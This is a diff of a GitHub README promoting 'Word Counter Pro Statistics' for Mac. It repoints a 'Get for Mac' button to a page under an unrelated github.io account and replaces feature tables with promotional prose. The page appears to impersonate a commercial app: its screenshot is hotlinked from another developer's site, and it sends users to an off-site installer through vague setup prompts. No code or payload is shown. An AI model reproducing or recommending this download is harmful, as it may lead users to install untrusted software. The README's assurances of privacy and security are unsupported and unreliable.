@@ -5,7 +5,7 @@
 <br>
 <div align="center">
 
-[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://ashab-tamaev-apps.github.io/.github/)
+[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://ashab-tamaev-apps.github.io/.github/wordcounter)
 
 </div>
 
@@ -14,17 +14,12 @@
 ## 📥 Installation Instructions for Mac
 1. Visit the website using the button above.
 2. Follow the setup prompts to install and activate Word Counter Pro on your Mac.
-3. After successful installation, follow the instructions.  
+3. After successful installation, follow the instructions.
 
 ---
 
 <div align="center">
   <img src="https://i0.wp.com/apptyrant.com/wordpress/wp-content/uploads/2025/05/wordcounterpro_macos_Sequoia.png?w=1450&ssl=1" width="800"/> 
-</div>
-<div align="center">
-
-[![Get for Mac](https://img.shields.io/badge/Get_for_Mac-green?style=for-the-badge&logo=apple)](https://ashab-tamaev-apps.github.io/.github/)
-
 </div>
 
 ---
@@ -42,28 +37,42 @@ From novelists to content creators, Word Counter Pro Statistics is trusted by th
 
 ---
 
-### 🎯 Key Features  
-| Feature | Description |
-|----------|-------------|
-| Real-Time Counting | Instant word and character count as you type |
-| Goal Tracking | Set and monitor daily writing targets |
-| Document Analysis | Detailed text statistics and breakdowns |
-| Reading Time | Estimated reading duration calculations |
-| Multiple Formats | Support for various text file types |
-| macOS Integration | Native features and Apple Silicon optimization |
-| Minimal Interface | Distraction-free counting and tracking |
+## 🎯 Key Features  
+
+**⚡ Real-Time Counting**  
+Experience instant word and character count updates as you type, ensuring you always know exactly where you stand with your writing goals without any delays or manual refreshes.
+
+**🎯 Goal Tracking**  
+Set personalized daily, weekly, or project-based writing targets and monitor your progress with visual indicators that keep you motivated and on track to achieve your objectives.
+
+**📊 Document Analysis**  
+Get comprehensive text statistics including sentence count, paragraph count, reading time estimates, and detailed breakdowns that provide deep insights into your writing composition.
+
+**⏱️ Reading Time Estimates**  
+Automatically calculate how long it will take readers to consume your content based on average reading speeds, helping you optimize article length for your target audience.
+
+**📁 Multiple Format Support**  
+Work seamlessly with various text file types including plain text, rich text, markdown, and more, ensuring compatibility with your existing writing workflow and tools.
+
+**🍎 Native Integration**  
+Enjoy deep macOS integration with native features like Touch Bar support, Dark Mode compatibility, and system-wide services that make the app feel like a natural part of your Mac.
+
+**✨ Minimal Interface**  
+Focus on your writing with a clean, distraction-free interface that stays out of your way while providing essential statistics exactly when you need them, without overwhelming visual clutter.
 
 ---
 
-### 🖥 System Requirements  
-| Component | Minimum | Recommended |
-|------------|----------|-------------|
-| OS | macOS 11.0 (Big Sur) | macOS 14.0 (Sonoma) or later |
-| Processor | Apple Silicon (M1) or Intel | Apple Silicon (M2/M3/M4) |
-| RAM | 4 GB | 8 GB or higher |
-| GPU | Metal-compatible GPU | Apple Silicon integrated GPU |
-| Storage | 500 MB free | SSD recommended |
-| Display | 1280×800 | Retina Display (2560×1600) or higher |
+## 🚀 Why Choose Word Counter Pro Statistics?
+
+Word Counter Pro Statistics represents the perfect balance between powerful functionality and elegant simplicity. Built specifically for the Mac platform, this application takes full advantage of Apple's cutting-edge technologies including Metal graphics acceleration, Grand Central Dispatch for multi-threading, and native SwiftUI components that ensure buttery-smooth performance even on older Mac hardware.
+
+The application has been meticulously optimized for both Intel-based Macs and the latest Apple Silicon chips, including M1, M2, M3, and M4 processors. This means whether you're running a MacBook Air from 2015 or the latest MacBook Pro with M4 Max, you'll experience the same level of responsiveness and efficiency. The software intelligently adapts to your hardware configuration, utilizing available resources without draining your battery or causing thermal throttling.
+
+What truly sets Word Counter Pro Statistics apart is its commitment to user privacy and data security. All processing happens locally on your device, with no data ever sent to external servers. Your documents, statistics, and writing habits remain completely private and under your control. The application also respects macOS security features including Gatekeeper, sandboxing, and FileVault encryption, ensuring your creative work stays protected.
+
+Regular updates bring not just bug fixes, but meaningful feature enhancements based on real user feedback. The development team actively listens to the community and implements requested improvements, ensuring the software evolves alongside your needs. Whether you're a novelist tracking your daily word count, a student managing essay requirements, a blogger monitoring article length, or a professional writer analyzing document statistics, Word Counter Pro Statistics provides the tools you need without unnecessary complexity.
+
+The application seamlessly integrates with your existing Mac workflow, supporting drag-and-drop file import, Quick Look previews, Spotlight searching, and even Shortcuts automation for power users. You can create custom workflows that automatically analyze documents, generate reports, and track progress across multiple projects without lifting a finger. This level of automation transforms what used to be manual, tedious tracking into an effortless background process.
 
 ---
 
